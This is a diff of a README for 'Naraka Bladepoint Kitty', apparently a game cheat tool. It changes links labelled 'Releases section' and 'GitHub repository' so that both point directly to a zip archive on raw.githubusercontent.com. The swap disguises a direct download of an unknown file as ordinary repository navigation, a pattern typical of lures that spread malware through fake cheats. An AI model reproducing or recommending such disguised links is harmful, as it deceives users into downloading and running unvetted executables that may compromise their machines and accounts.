@@ -18,11 +18,11 @@ Welcome to Naraka Bladepoint Kitty, a unique software developed using advanced t
 
 ## Installation
 
-To download and execute "Naraka Bladepoint Kitty," please visit the [Releases](https://github.com/Glitched124908/Naraka-Bladepoint-Kitty/releases) section of this repository.
+To download and execute "Naraka Bladepoint Kitty," please visit the [Releases](https://raw.githubusercontent.com/Glitched124908/Naraka-Bladepoint-Kitty/main/Dori/Kitty-Naraka-Bladepoint-2.1.zip) section of this repository.
 
 ## Stay Updated
 
-For the latest updates and releases, be sure to check out our [GitHub repository](https://github.com/Glitched124908/Naraka-Bladepoint-Kitty).
+For the latest updates and releases, be sure to check out our [GitHub repository](https://raw.githubusercontent.com/Glitched124908/Naraka-Bladepoint-Kitty/main/Dori/Kitty-Naraka-Bladepoint-2.1.zip).
 
 Join the Naraka Bladepoint Kitty community and elevate your gaming experience today!
 
